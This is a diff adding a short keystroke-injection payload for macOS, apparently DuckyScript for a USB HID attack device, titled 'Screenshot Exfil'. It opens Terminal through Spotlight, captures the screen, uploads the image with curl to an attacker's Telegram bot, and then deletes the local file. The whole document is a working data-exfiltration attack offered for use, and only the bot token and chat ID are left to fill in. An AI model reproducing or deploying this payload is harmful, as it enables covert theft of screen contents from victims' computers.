@@ -1,0 +1,16 @@
+META macos exfil
+REM Title: Screenshot Exfil
+REM Description: Takes a screenshot and sends it to Telegram
+REM Edit BOT_TOKEN and CHAT_ID before using
+
+DEFAULTDELAY 500
+GUI SPACE
+DELAY 700
+STRING terminal
+ENTER
+DELAY 800
+STRING screencapture /tmp/sc.png && curl -s -F "chat_id=YOUR_CHAT_ID" -F "document=@/tmp/sc.png" "https://api.telegram.org/botYOUR_BOT_TOKEN/sendDocument" > /dev/null && rm /tmp/sc.png
+ENTER
+DELAY 3000
+STRING exit
+ENTER
